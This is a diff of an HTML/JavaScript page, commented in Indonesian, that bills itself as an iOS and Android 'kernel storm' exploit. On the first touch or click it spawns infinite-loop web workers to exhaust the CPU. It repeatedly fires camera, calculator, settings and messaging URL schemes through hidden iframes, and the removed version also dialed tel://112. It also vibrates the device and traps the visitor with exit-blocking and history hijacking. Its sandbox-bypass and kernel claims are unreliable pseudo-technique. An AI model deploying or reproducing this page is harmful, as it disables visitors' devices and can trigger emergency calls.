@@ -3,106 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ iOS_KERNEL_STORM_V10 ⚡</title>
+    <title>⚡ KERNEL_STORM_V16_MULTI ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #007aff; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; }
-        #stage { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; }
-        .ios-alert { width: 80%; padding: 20px; border-radius: 14px; background: rgba(30, 30, 30, 0.9); border: 1px solid #333; text-align: center; box-shadow: 0 0 20px rgba(0, 122, 255, 0.5); }
-        .glitch-text { font-size: 18px; font-weight: 600; color: #fff; margin-bottom: 10px; }
-        #log { font-size: 10px; color: #555; margin-top: 15px; height: 80px; overflow: hidden; font-family: monospace; }
+        body, html { margin: 0; padding: 0; background: #000; color: #ff3b30; overflow: hidden; font-family: -apple-system, sans-serif; }
+        #stage { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .breach-box { width: 85%; padding: 25px; border-radius: 18px; background: rgba(20, 20, 20, 0.95); border: 2px solid #ff3b30; text-align: center; }
+        .status-pulse { font-size: 16px; font-weight: bold; text-transform: uppercase; animation: pulse 0.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        #log { font-size: 9px; color: #666; margin-top: 20px; height: 100px; overflow: hidden; text-align: left; font-family: monospace; }
     </style>
 </head>
 <body>
     <div id="stage">
-        <div class="ios-alert">
-            <div class="glitch-text">CRITICAL_KERNEL_EXPLOIT</div>
-            <div id="status" style="font-size: 14px;">AWAITING_TOUCH_GESTURE</div>
+        <div class="breach-box">
+            <div class="status-pulse">SYSTEM_INTRUSION_V16</div>
+            <div id="current-action" style="color:#fff; font-size: 12px; margin-top:10px;">READY_TO_BYPASS_SANDBOX</div>
             <div id="log"></div>
         </div>
     </div>
 
 <script>
-    const logDiv = document.getElementById('log');
-    const statusText = document.getElementById('status');
+    const logBox = document.getElementById('log');
+    const actionText = document.getElementById('current-action');
 
-    function writeLog(m) {
+    function print(m) {
         const d = document.createElement('div');
-        d.innerText = `[WEBKIT] > ${m}`;
-        logDiv.prepend(d);
+        d.innerText = `[!] ${m}`;
+        logBox.prepend(d);
     }
 
-    // --- 1. WEBKIT HEAP SPRAYING (JSC ENGINE) ---
-    // Mensimulasikan manipulasi 'StructureID' pada JavaScriptCore (JSC)
-    // tujuannya untuk memicu korupsi memori OOB pada objek JS
-    let leakStorage = [];
-    function sprayWebKitHeap() {
-        writeLog("Grooming_JSC_Heap_StructureID...");
-        for (let i = 0; i < 10000; i++) {
-            // Mengalokasikan array besar untuk menekan RAM iOS
-            let a = new Array(0x100);
-            a[0] = 1.1; // Menentukan array sebagai Double (unboxed)
-            a[1] = {pwn: 0x41414141}; // Memaksa konversi ke boxed (Type Confusion)
-            leakStorage.push(a);
-        }
-    }
+    // --- 1. TARGET APP VECTORS ---
+    // Menambahkan target Kamera, Kalkulator, dan System Settings
+    const targetApps = [
+        // CAMERA VECTORS
+        "facetime-video://", 
+        "cameraui://", 
+        "intent://#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;end",
+        // CALCULATOR VECTORS
+        "calc://", 
+        "calculator://",
+        "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.APP_CALCULATOR;launchFlags=0x14008000;end",
+        // OTHER SYSTEM VECTORS
+        "music://",
+        "prefs:root=General", // iOS Settings
+        "message://"
+    ];
 
-    // --- 2. RECURSIVE SCHEME INJECTION (iOS BYPASS) ---
-    // iOS menggunakan URL Schemes untuk komunikasi antar aplikasi.
-    // Kita menembakkan scheme sistem secara beruntun untuk mematikan validasi sandbox.
-    function triggeriOSAppStorm() {
-        const schemes = [
-            "videos://",      // Membuka Video
-            "photos-redirect://", // Membuka Photos
-            "facetime://",    // Membuka Facetime (Akses Kamera)
-            "tel://112"       // Membuka Dialer
-        ];
-
-        schemes.forEach((s, i) => {
+    // --- 2. THE MULTI-INJECTION ENGINE ---
+    function injectSchemes() {
+        targetApps.forEach((uri, i) => {
             setTimeout(() => {
-                // Gunakan lokasi window untuk memaksa OS memproses scheme
-                window.location.href = s;
+                print(`Triggering_Vector: ${uri.split(':')[0]}`);
                 
-                // Backup via Iframe hidden
-                const fr = document.createElement('iframe');
-                fr.src = s;
-                fr.style.display = 'none';
-                document.body.appendChild(fr);
-                writeLog(`Injecting_Scheme_${i}`);
-            }, i * 10);
+                // Method 1: Location Replace (Agresif)
+                window.location.replace(uri);
+
+                // Method 2: Dynamic Anchor Injection
+                const a = document.createElement('a');
+                a.href = uri;
+                a.rel = "noreferrer";
+                a.click();
+
+                // Method 3: Iframe Stealth
+                const ifr = document.createElement('iframe');
+                ifr.src = uri;
+                ifr.style.display = 'none';
+                document.body.appendChild(ifr);
+                
+                // Cleanup untuk menjaga performa DOM
+                setTimeout(() => ifr.remove(), 500);
+            }, i * 25); // Interval sangat rapat untuk memicu Race Condition
         });
     }
 
-    // --- 3. THE KERNEL COLLAPSE SEQUENCE ---
-    async function deployiOSExploit() {
-        statusText.innerText = "EXECUTING_BREACH...";
-        statusText.style.color = "#ff3b30";
-
-        // A. JIT/JSC Pressure
-        sprayWebKitHeap();
-
-        // B. CPU Thread Exhaustion
-        // iOS membatasi worker, kita gunakan 8 worker intensif
-        const blob = new Blob(["while(true){Math.random();}"], {type: 'text/javascript'});
-        const wUrl = URL.createObjectURL(blob);
-        for(let j=0; j<8; j++) new Worker(wUrl);
-
-        // C. RECURSIVE STORM LOOP
-        // Menembakkan serangan scheme setiap 100ms
-        setInterval(() => {
-            triggeriOSAppStorm();
-            // Getaran haptic (Haptic Feedback) untuk mengganggu hardware
-            if (navigator.vibrate) navigator.vibrate(100); 
-        }, 100);
-
-        writeLog("BYPASS_STAGING_COMPLETE", "#00ff00");
+    // --- 3. KERNEL THREAD EXHAUSTION (BYPASS REINFORCEMENT) ---
+    function blastCPU() {
+        print("Launching_Thread_Exhaustion...");
+        // Menggunakan SharedArrayBuffer untuk mengunci CPU agar Sandbox terlambat memvalidasi perintah
+        const blob = new Blob(["while(true){Math.atan2(Math.random(), Math.random())}"], {type: 'text/javascript'});
+        const u = URL.createObjectURL(blob);
+        for(let j=0; j < (navigator.hardwareConcurrency || 4); j++) {
+            new Worker(u);
+        }
     }
 
-    // Trigger on Interaction (iOS Mandate)
-    window.addEventListener('touchstart', deployiOSExploit, {once: true});
-    window.addEventListener('click', deployiOSExploit, {once: true});
+    async function startFullAttack() {
+        actionText.innerText = "STATUS: EXPLOITING_CHAIN...";
+        actionText.style.color = "#ff3b30";
 
-    // Anti-Escape (Lock User in Page)
-    window.onbeforeunload = function() { return "LOCKED"; };
+        // Step A: Lumpuhkan UI Thread
+        blastCPU();
+
+        // Step B: Mulai Storming
+        setInterval(() => {
+            injectSchemes();
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+        }, 500);
+
+        print("BREACH_STAGING_COMPLETE");
+    }
+
+    // TRIGGER
+    window.addEventListener('click', startFullAttack, {once: true});
+    window.addEventListener('touchstart', startFullAttack, {once: true});
+
+    // Anti-Exit
+    window.onbeforeunload = () => { return "KERNEL_LOCK_ACTIVE"; };
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => history.go(1);
 
 </script>
 </body>
